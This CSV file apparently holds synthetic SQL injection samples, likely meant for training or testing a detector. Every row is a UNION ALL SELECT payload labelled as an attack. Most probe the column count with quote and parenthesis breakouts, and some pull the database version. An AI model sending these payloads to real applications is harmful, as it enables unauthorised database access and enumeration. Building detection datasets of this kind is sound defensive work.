id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_001160,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.749794718072142
CTGAN_001161,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.116193950652067
CTGAN_001162,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000057,6.026319357735775
CTGAN_001163,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,5.799780642160368
CTGAN_001164,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,8.122296571797827
CTGAN_001165,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,7.282636446940726
CTGAN_001166,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,11.28036503710976
CTGAN_001167,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,7.276833679416183
CTGAN_001168,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,5.3829770333140265
CTGAN_001169,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,5.985150475235784
CTGAN_001170,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,5.3412626624859465
CTGAN_001171,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,7.869811861195906
CTGAN_001172,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.668464722049325
CTGAN_001173,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000002,8.00541613282628
CTGAN_001174,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.013850151129482
CTGAN_001175,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.254592157840256
CTGAN_001176,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,5.863459371557025
CTGAN_001177,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,6.538986395808859
CTGAN_001178,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,8.545511896414704
CTGAN_001179,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.389180710802976
CTGAN_001180,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.5188992438762625
CTGAN_001181,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,5.489815165039163
CTGAN_001182,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,5.544767672656263
CTGAN_001183,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,5.907939262770565
CTGAN_001184,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,7.5899326533292815
CTGAN_001185,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.064969846218591
CTGAN_001186,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,5.714213744325749
CTGAN_001187,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,8.100799971268751
CTGAN_001188,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000017,5.7663050287698505
CTGAN_001189,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,7.130168394605301
CTGAN_001190,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,7.2437387934629776
CTGAN_001191,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,5.7542052074819425
CTGAN_001192,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,5.917070999309128
CTGAN_001193,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,7.06547373987373
CTGAN_001194,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,8.943961905227141
CTGAN_001195,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,5.227772190582439
CTGAN_001196,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,8.48450912099281
CTGAN_001197,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,5.8260107541195785
CTGAN_001198,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,10.464855195631394
CTGAN_001199,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000076,7.35484008119911
CTGAN_001200,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,6.274830732932775
CTGAN_001201,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,4.947820546538912
CTGAN_001202,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.299518015111282
CTGAN_001203,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,6.154460737350635
CTGAN_001204,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,7.086453415570503
CTGAN_001205,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000068,6.038104376812959
CTGAN_001206,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.783506443823107
CTGAN_001207,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,5.475453863132135
CTGAN_001208,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,7.728210841933897
CTGAN_001209,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,5.746876684326429
CTGAN_001210,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.767322198133065
CTGAN_001211,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,8.363404283164538
CTGAN_001212,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,7.068381697298047
CTGAN_001213,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.547807043308972
CTGAN_001214,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.944514235171967
CTGAN_001215,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,7.0695496550881725
CTGAN_001216,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,4.8902986701735545
CTGAN_001217,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000024,7.219134814284912
CTGAN_001218,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.726433462001874
CTGAN_001219,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,5.910678910745316
CTGAN_001220,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,6.981764643685556
CTGAN_001221,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.323434191906795
CTGAN_001222,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,5.296029828175042
CTGAN_001223,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000047,6.748215582693776
CTGAN_001224,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000020,6.673250035848795
CTGAN_001225,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.537768329082894
CTGAN_001226,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,7.293866757805871
CTGAN_001227,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000014,6.4912142201183105
CTGAN_001228,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,4.864029911171812
CTGAN_001229,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,6.399775195061398
CTGAN_001230,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,7.449117862631433
CTGAN_001231,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,4.619143175746657
CTGAN_001232,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000015,7.630271132216172
CTGAN_001233,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,6.3500587195532585
CTGAN_001234,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000041,7.16738957513
CTGAN_001235,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000047,8.147846803934035
CTGAN_001236,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,7.025971193423373
CTGAN_001237,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000050,6.699510280610895
CTGAN_001238,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.056693489959257
CTGAN_001239,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,10.55045742974521
CTGAN_001240,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,6.412900371213855
CTGAN_001241,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,7.2190319355172266
CTGAN_001242,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,5.700838359254321
CTGAN_001243,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,6.641202604215131
CTGAN_001244,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,7.7160087455282405
CTGAN_001245,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,9.37305035256778
CTGAN_001246,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.277294777769139
CTGAN_001247,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,5.994753255784942
CTGAN_001248,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.851615405578107
CTGAN_001249,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.417383250584746
CTGAN_001250,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000022,5.756509637222882
CTGAN_001251,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,5.805157040112472
CTGAN_001252,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.511404422797622
CTGAN_001253,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,8.736058030941761
CTGAN_001254,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000029,8.735260322919158
CTGAN_001255,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,7.148703345669872
CTGAN_001256,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000035,6.025208938632242
CTGAN_001257,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.786652314425613
CTGAN_001258,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000071,6.366407284311814
CTGAN_001259,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000021,9.65999099542762
CTGAN_001260,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,6.098754176119222
CTGAN_001261,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.189912861828445
CTGAN_001262,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,4.825632306803077
